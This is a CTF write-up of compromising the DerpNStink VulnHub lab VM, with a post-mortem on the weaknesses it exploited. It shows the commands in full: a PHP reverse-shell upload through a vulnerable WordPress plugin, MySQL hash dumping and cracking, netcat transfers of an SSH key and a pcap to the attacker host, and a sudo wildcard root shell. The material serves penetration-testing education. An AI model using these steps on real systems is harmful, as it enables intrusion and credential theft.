[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To-Guides/HowTo-index.html) <br>


# CTF Writeup:
# DerpNStink on VulnHub

<br>
![a0-logo](https://i.imgur.com/Dg6sbq1.png)
<br>

## 26 March 2017

Get the VM here: [https://www.vulnhub.com/entry/derpnstink-1,221/](https://www.vulnhub.com/entry/derpnstink-1,221/)

[@securekomodo](https://twitter.com/@securekomodo), the machine's creator, gives us the following:

*Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder*

*Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.*

## Introduction

DerpNStink requires knowledge of a wide array of pentesting skills, but doesn't dive particularly deeply into any of them. You will use a plethora of tools, but won't have to go too far past the basics of each to get the job done.

Regardless, I consider this to be a good "self-benchmarking" CTF. The sheer number of steps involved pushes it towards the "intermediate" end of the spectrum, even if each of those steps is pretty straightforward.  

DerpNStink is not a great choice for your first CTF, and I did not explain each step with the first-time reader in mind.
All tools and methods used are available by default in Kali.

I've blurred out any passwords, hashes or keys that aren't defaults.

## 1. Initial Scans

The VM is designed to grab an IP from DHCP, and you'll need find out what that is. <br>

Hit it with a heavy-duty `nmap` scan for expediency's sake.

`nmap -p- -A 192.168.56.101 -oA nmap_AFullTCP`

<br>
![a1-nmap](https://i.imgur.com/3XOKenv.png)
<br>

* FTP at 21 using vsftpd
* ssh at 22  using Openssh
* HTTP at 80 using Apache

From setting up my own VMs, I know these versions are what Ubuntu uses in a Net Install that includes FTP, ssh and HTTP capabilities. `nmap` also suggests that the box is running Ubuntu.

There's also a `robots.txt` webpage listing  `/php/` and `/temporary` as off-limits.

Before filling up in the server access log, we can visit the site like a regular user and try to gain information quietly.

`http://192.168.56.101/`

<br>
![A2-mainpage](https://i.imgur.com/dJ4yXmO.png)
<br>

The obscure-hint part of my brain sounds a quiet alarm at the name "DerpNStink" <br>

Could *Derp N' Stink* lead to *DNS?*

Seems pretty thin, especially since I recognize the character on the left as the South Park character [Mr. Derp,](https://www.youtube.com/watch?v=2zTDXX9ReyU) whose "antics go straight to the funnybone." <br>

I'll label this as "likely a coincidence," while fighting the urge to try `funnybone` as the root password. <br>

Let's visit the areas prohibited by `robots.txt`

`http://192.168.56.101/php/`

<br>
![a3-phpsite](https://i.imgur.com/FzMg3sp.png)
<br>

There isn't anything here that we don't already know, so we'll check `/temporary`. <br>

When we do, we see it's just a text page saying
`Try Harder!`


When we see trolling like this, we need to keep investigating. <br> Taunts like this may cause you to storm off in a huff of incredulity without digging deeper, but
beneath the hijinks are a great place to hide something of value. <br>

With this in mind, I looked at the source code of the page and found *precisely nothing*. <br>

I managed to get trolled twice by the same page, impressively. <br>
However, I took this opportunity to view the source code of the index page.

<br>
![a4-source1](https://i.imgur.com/a3my7EV.png)
<br>

We see some `js` and `css` directories that might be worth digging in to, but the link to `/webnotes/info.txt` is most interesting.  <br>

By looking at the line numbers, we can see there is more to this page than what is initially displayed...

<br>
![a5-source2](https://i.imgur.com/UjQbonx.png)
<br>


`flag1` Captured! <br>
One down, three to go.

What's at that interesting link?


## 2. Maybe "DerpNStink" Did Actually Hint at "DNS"

`view-source:http://192.168.56.101/webnotes/info.txt`

This lead to another all-text page that contained the following message: <br>
`<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->`

We must have to update our hosts file to get the full DerpNStink experience.
But what should we use as a hostname? <br>
Maybe the `/webnotes` directory itself can offer a clue.

`view-source:http://192.168.56.101/webnotes/`

<br>
![a6-webnotes](https://i.imgur.com/CjXJhrp.png)
<br>

Paydirt. <br>
This page gives us 2 useful pieces of information:
* Hostname: `derpnstink.local`
* Username: `stinky@derpnstink.local`


Add `derpnstink.local` to your `/etc/hosts` file with

`echo "<DERPNSTINK IP ADDR>   derpnstink.local" >> /etc/hosts`

You __*better*__ use `>>` and __NOT__ `>` or you will overwrite your hosts file and have problems.

Now we know that we are directed to the full version of the website, we'll run `nikto`.

`nikto -h derpnstink.local -o nikto_hostadded_result.txt`

<br>
![a7-nikto](https://i.imgur.com/beITnCN.png)
<br>


## 3. DeRPnStiNK Professional Services: The Blog
Nikto thinks the `/weblog/` directory might be interesting.<br>

<br>
![a8-weblog](https://i.imgur.com/SlwQxcM.png)
<br>

We can take this time to read all about Misters Derp and Stinky and their colorful pasts, but the most interesting thing on the page is the phrase __Proudly Powered by Wordpress__.

Enter `wpscan`

  `wpscan -u http://derpnstink.local/weblog/ --enumerate upt`

<br>
![a9-wpscan1](https://i.imgur.com/UR31lkP.png)
![a10-wpscan2](https://i.imgur.com/MG7zEGN.png)
![a11-wpscan1](https://i.imgur.com/SNLwzfC.png)
<br>

WPScan delivers tons of useful information. <br>
The site is running on an outdated version of Wordpress, and contains a plugin with an Arbitrary File Upload vulnerability. Arbitrary File uploads usually mean shells.

We've also got two usernames, `unclestinky` and `admin`. Admin looks like a default user account, and default user accounts often have default passwords.


`http://derpnstink.local/weblog/wp-login.php`

<br>
![a12](https://i.imgur.com/Jek2BZH.png)
<br>

`admin:admin`

[And we're in.](https://i.imgur.com/g3N3aZT.jpg)


## 4. Sliding Our Way Into a User Shell

Surprisingly, we don't have the site's admin control page. This user only has access to one of the plugins.

But not just any plugin, the *vulnerable* plugin. The one we use will to upload a shell payload.

The WPScan result listed that we could find vulnerability details at [https://www.exploit-db.com/exploits/34514/](https://www.exploit-db.com/exploits/34514/), but it is a bit faster to just run...

`searchsploit -x 34514`


The details tell us that this is a very straightforward Arbitrary File Upload, and we just need to follow some simple steps.
1. Upload a "New Slide" Using the plugin
2. Choose the `FILE.php` containing our payload instead of an image.
3. The file will be accessible at http://derpnstink/wordpress/wp-content/uploads/slideshow-gallery/FILE.php

Let's do this.

Our payload will be the [php-reverse-shell from pentestmonkey.net](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), that can be found on Kali at `/usr/share/webshells/php/php-reverse-shell.php`. Copy it to your working directory.

`cp /usr/share/webshells/php/php-reverse-shell.php .`

Edit the shell using your favorite text editor so it will connect to your local machine at the correct IP and port.

```
set_time_limit (0);
$VERSION = "1.0";
$ip = 'local.machine.ip.addr';  // CHANGE THIS
$port = PORTNUM;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Start your listener before uploading the shell.

`nc -lnvp PORTNUM`


Click on the Slideshow Plugin Panel, and hit the  __*Add New*__ button.

<br>
![a13](https://i.imgur.com/dRRZTsW.png)
<br>

Populate the title and description fields and upload the shell file.

<br>
![a14](https://i.imgur.com/o8we9ln.png)
<br>

If your listener is running and you've set the parameters correctly, the shell will pop as soon as you press __"Save Slide"__. <br>

In fact, if I needed to, I could just refresh the slideshow plugin page if I needed to resend the shell command. This must be because the plugin control page attempts to show a preview of the image.


<br>
![a15](https://i.imgur.com/YXE4YhG.png)
<br>

Check for python, and when you find it, use it to spawn a tty.


`which python` <br>
`python -c 'import pty;pty.spawn("/bin/bash")'`


<br>
![a16](https://i.imgur.com/x9nVe74.png)
<br>

## 5. Science 101 with Professor `www-data`

Enumeration starts in the `home`.

`ls -l /home`

<br>
![A17](https://i.imgur.com/tVmEsXk.png)
<br>

We don't have any permissions in the user folders, but that's not what `www-data` is for. <br>
It is used to manage the database and other files used to run the Wordpress site.
Therefore, we should try *acting* like `www-data` user and poke around in the website directories.

It's time to perform some science. <br>
I present two hypotheses:

__Observations #1__
* `www-data` performs operations needed to run Wordpress site
* Wordpress uses MySQL
* MySQL must be logged into using credentials

__Hypothesis #1__
* `www-data` must "know" these credentials to access the MySQL database

__Observations #2__
* `www-data` can read files in the `/var/www/html/weblog` directory where Wordpress is installed
* One of the files in this directory is called `wp-config.php`
* "Config" is short for "configuration"

__Hypothesis #2__
* `www-data` reads MySQL login credentials from `/var/www/html/weblog/wp-config.php`, and this would fall under "configuration."

As a good `www-data` user, it's our place, nay, our *DUTY* to look for credentials inside this file.<br>
All good science requires experimentation. <br>



`cd /var/www/html` <br>
`ls` <br>
`cd weblog` <br>
`ls`

<br>
![A18](https://i.imgur.com/bhItbND.png)
<br>

`less wp-config.php`

<br>
![A19](https://i.imgur.com/dqWck2M.png)
<br>

Our experiment is a great success!<br>
You should receive your Nobel prize in the mail in 6-8 weeks.<br>

We've learned that we can log into MySQL using `root:mysql` <br>
The `root` username is very promising, we probably have total database access.<br>


## 6. Raiding MySQL

`mysql -u root -p`

Use `mysql` as the password.

<br>
![a20](https://i.imgur.com/HzparnQ.png)
<br>

With root access we have a buffet of data at our fingertips.

`show databases;`

If we can find login credentials, we'll use them to attempt to login to ssh or Wordpress.

`use wordpress;`

Wordpress hashes take a while to try and crack, but we'll see if we can find them anyway.

`show tables;`

<br>
![A21](https://i.imgur.com/Vw3eqce.png)
<br>


`show columns from wp_users;` <br>
`select user_login,user_pass from wp_users`


<br>
![A22](https://i.imgur.com/98dbQZp.png)
<br>

*If you look closely and see the "flag2" column, you are more observant than I was! We'll come back to that later.*

Save the user login and user password columns to a local file so we have the option to try and crack the hashes. We already know `admin`'s Wordpress password, so it won't take too long to make a decent effort on `unclestinky`'s hash.

Let's see what's in the database called `mysql`.


`show databases;` <br>
`use mysql;` <br>
`show tables;`

MySQL hashes are not very computationally expensive, so we'll try to crack them before making any attempts on the Wordpress hashes.

<br>
![A23](https://i.imgur.com/lsGlZ5P.png)
<br>

`show columns from user;` <br>
`select User,Password from user;`

<br>
![A24](https://i.imgur.com/25WrENx.png)
<br>


Save these to a local file, and call it `mysql_db.txt` and we'll feed them to John The Ripper.<br>
`john` is a bit of a picky eater, though, so we need to conform them to the `username:hash` format.


We can do this with a __beastly__ one-liner that uses `cat`, `grep`, `tr`, `cut` and `sort`.


`cat mysql_db.txt | egrep -i '[a-f0-9]{32}' | tr -d [[:blank:]] | tr '|' ':' | cut -d ':' -f 2,3 | sort -u > mysql_hashes.txt`

I've broken down the one-liner into stages so you can see how we arrived at the final product. I'm not certain that it is the most efficient, shortest possible command, but it works.

<br>
![A25](https://i.imgur.com/K0tberf.png)
<br>


We'll use the trusty `rockyou` wordlist that comes with Kali, and is the agreed upon wordlist for
CTF-ing. You can find it in `/usr/share/wordlists/`, but you may have to unarchive it.

`john mysql_hashes.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt`

<br>
![A26](https://i.imgur.com/5PipGXJ.png)
<br>


We crack 2 of the hashes, and come away with UncleStinky's password. <br>
There is a good chance that UncleStinky uses this password everywhere, and it may be his user password.  <br>

We already know that there is a `stinky` user on this machine, so let's try to `su` our way over.


`exit` <br>
`su stinky`


<br>
![A27](https://i.imgur.com/t1XOAFZ.png)
<br>


## 7. The Key is Guarded By A Troll(ing Attempt)

We are `stinky`, but so is this shell.
Let's try to login to ssh now that we've got the password.

`ssh stinky@derpnstink.local`

<br>
![A28](https://i.imgur.com/NMnKeqN.png)
<br>

We need to dig up the ssh key. <br>
Odds are it is in `stinky`'s' home directory.


`cd ~` <br>
`ls` <br>
`ls *`


<br>
![A29](https://i.imgur.com/QGApiaD.png)
<br>

A flag has been left here for us to Capture.

`cat Desktop/flag.txt`


The output of this `cat` shows text that includes `flag3(...)` <br>

Uh oh, the last one we captured was `flag1`. <br> I suppose we missed `flag2`. We'll likely have an easier time finding i  as `root`, so we'll simply continue down the path to pwnership. <br>

2  flags down, 2 flags to go.



In addition to `Desktop/flag.txt`, we also see `Documents/derpissues.pcap`. That may contain valuable information; we will investigate shortly. For now, we want that ssh key. <br>
It might be in the `ftp` files, so let's dig.


`ls ftp/files` <br>
`ls ftp/files/ssh` <br>
`ls ftp/files/ssh/ssh`


<br>
![A30](https://i.imgur.com/GZ0jC3x.png)
<br>


Very funny, `stinky`. <br>
I get the feeling we are being trolled, but that's reason to continue. <br>
Luckily, we know that `ls` has the recursive `-R` flag.

The presence of the `network-logs` folder further suggests that the pcap file will have something important to offer.

`ls -R ftp/files/ssh`

<br>
![A31](https://i.imgur.com/PcIHCqZ.png)
<br>

Yes, that's __seven__ directories deep. <br>


`cd ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh`

I fully expect this to be a text document containing the message `this isn't the ssh key` with an ASCII middle finger.


`cat key.txt`

<br>
![A32](https://i.imgur.com/sqLBVDt.png)  
<br>

It's actually a key, hooray! <br>
Send it to your local machine using `nc` and we should be able to log in to ssh.

First, we need to see if `stinky` can use `nc`. <br>
In the stinkshell, run a `which` command.

`which nc`

This will show that `nc` is there for us to use. <br>

Set up the listener on your local machine, making sure to use a different port than you used for the php-reverse-shell.

`nc -lnvp PORTNUMBER > key.txt`

<br>
![A33](https://i.imgur.com/cMLc8X0.png)  
<br>

Send the file from the stinkshell over to your local machine.

`nc local.machine.ip.addr PORTNUMBER < key.txt`

<br>
![A34](https://i.imgur.com/qzNgAq3.png)
<br>

When you receive the key, you'll need to change the file permissions or `ssh` will complain.

`chmod 600 key.txt`

Include the `-i` flag with your `ssh` command to use the key.

`ssh stinky@derpnstink.local -i key.txt`

<br>
![A35](https://i.imgur.com/uT0bZ5b.png)  
<br>

## 8. Sniffing with "Stinky"

We've got a good shell now, let's see if `stinky` can run `sudo` with anything interesting.

`sudo -l`

This results in a message saying that we `stinky` is unable to run `sudo`. <br>

The `derpissues.pcap` file is waiting for us, but pcap files can be pretty extensive. It can be hard to find the right packets amongst everything flying around.

Maybe the `/ftp/files/network-logs` directory can help provide context.

`ls /ftp/files/network-logs`

In that folder is a file named `derpissues.txt`. Let's take a peek.

`cat ftp/files/network-logs/derpissues.txt`

<br>
![A36](https://i.imgur.com/QI6Einw.png)
<br>


If Mr. Derp set up a Wordpress user account while the network was being sniffed, then there will be a packet containing the password to his account.

We can use the same `nc` process we used to transfer the ssh key to transfer `derpissues.pcap` to our local machine. From there, we can open it up in `wireshark` hunt down those credentials.

`cd Documents`<br>
`ls`

Enable the listener on your local machine:

`nc -lnvp 53000 > derpissues.pcap`


Start the transfer from the `stinky` ssh shell:

`nc 192.168.56.1 53000 < derpissues.pcap`

Upon arrival, open it on your local machine using `wireshark`:

`wireshark derpissues.pcap`

<br>
![A37](https://i.imgur.com/HPpYmEF.png)
<br>

A lot of info was captured in this file, but we only care about Mr. Derp's interaction with the Wordpress site over `http`. Even more specifically, we only care about information Mr. Derp sent to the server via POST request.

With the right filter, Wireshark will only show us these requests.

`http.request.method == "POST"`

There weren't very many sent, so we can simply browse the *Info* column for something interesting.

<br>
![A38](https://i.imgur.com/9QXYrV5.png)
<br>

`user-new.php` sounds like the page Mr. Derp would send a request to in order to create his account. This would be where he'd enter in his password.

Select the HTML Form URL encoded part of the packet, and look at the values. There, in the clear, is Mr. Derp's rather unsurprising password. Unfortunately, it was not `funnybone`.


<br>
![A41](https://i.imgur.com/yYMh0Tu.png)
<br>

This is why we use HTTPS.


If `mrderp` is anything like `stinky`, he will reuse passwords. Simply `su` your way to `mrderp` account from the ssh window.

`su mrderp`

<br>
![A40](https://i.imgur.com/jJjYS5m.png)
<br>


## 9. If You Like `sudo`, Then You're Gonna Love Mr. Derp!

If `stinky` acted as the webmaster, then perhaps `mrderp` is the boss of this machine.

`sudo -l`

<br>
![A42](https://i.imgur.com/KZDA6G9.png)
<br>

When I saw this, I was shocked, appalled, and delighted. <br>
Does the `sudoers` file allow *WILDCARDS*?  Dangerous.


`(ALL) /home/mrderp/binaries/derpy*` means that anything we put in the `/home/mrderp/binaries` directory with a filename that begins with `derpy` can be run as root.

We want a root shell, so we just need to create a little script that spawns one.

`mkdir binaries` <br>
`cd binaries` <br>
`nano derpyshell.sh` <br>

We just need a crunchbang and a shell command.

```
#!/bin/sh
/bin/bash
```

<br>
![A43](https://i.imgur.com/fdygfa0.png)
<br>

To save and exit nano, press `ctrl+x`,`Y`, and enter.

Finally, make the script executable.

`chmod +x derpyshell.sh`

<br>
![A44](https://i.imgur.com/2N0HFvp.png)
<br>

Run it with `sudo`, and you'll be root.

`sudo ./derpyshell.sh`

<br>
![A45](https://i.imgur.com/pjfB4w5.png)
<br>


## 10. Final Flag Roundup

`flag4` is kept in the `/root` directory, so head on over and read it with `cat`.

3 down, one to go.
We have flags 1, 3 and 4 - but where is `flag2`?

Since we found `flag1` on the website, and `flag3` was found while accessing the machine as `stinky`, I concluded that `flag3` must be between those two two points.

This corresponded to the parts where we enumerated the website, found the blog, spawned our php-shell, and raided the databases. All of these actions were related to files kept in `/var/www/html`, which as root, we have complete control over.


The flags used the `flagN` format, so we should head over to the directory and `grep` for `flag2`.

`cd /var/www/html/` <br>
`grep -iR 'flag2' *`

<br>
![A45](https://i.imgur.com/i8QCKi0.png)
<br>

Nothing jumps out from this search, but there is still a decent chance the flag is on the website somewhere. Where haven't we looked? Hmm..


As soon as we cracked `stinky`'s password, we logged right into ssh. We never even tried to log into his Wordpress account.

<br>
![A46](https://i.imgur.com/Pdu74PV.png)
<br>

UncleStinky is the Wordpress Admin, and he has saved a draft of a blog post.
That draft is named "Flag.txt," and contains the elusive `flag2`.

<br>
![A47](https://i.imgur.com/Bxd17Az.png)
<br>

All Flags Captured!


## Post-Mortem

Like most CTFs, this box was intentionally made vulnerable for fun's sake. However, all of these vulnerabilities can be found in the real world.

Here's what made DerpNStink rootable.


__Use of Default/Obvious Credentials__
* `admin:admin` logged into Wordpress. This really can be found in the real world. [Just ask Equifax Argentina.](http://www.bbc.com/news/technology-41257576)
* `root:mysql` was all it took to get complete control of the MySQL database.


__Least Privilege Violations__
* The `admin` Wordpress user did not have administrative control over the site, but could still control the Slideshow plugin.
* While logged into the system as `www-data`, we could look at `stinky`'s home directory. Why would this be necessary?

__Outdated Versions of Plugins/3rd Party Software__
* The slideshow plugin was using a vulnerable version from 2014, which has since been patched.
* While this version was obviously put in place to allow Arbitrary File Upload for the CTF, real webmasters may think maintenance of 3rd Party software isn't their problem. Vendors can release a patch, but the sysadmin must actually install it.


__Credential Reuse__
* Both users of this system had one single password that was used to for both Wordpress and system access.
* Unfortunately, this practice is as common as it is dangerous.


__Weak Passwords__
* `stinky`'s password (they only used one) was entirely alphanumeric, and used the minimum number of characters commonly allowed.
* Since we were likely meant to crack this password from a hash, it was also part of the famous `rockyou` wordlist.


__Lack of HTTPS__
* `mrderp`'s password had a very secure length of 28 characters - we weren't going to find it via brute force. However, the password was sniffed out using packet capture due to the fact that the web page used unencrypted HTTP.


## Thanks for reading!

<br>
[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To-Guides/HowTo-index.html) <br>
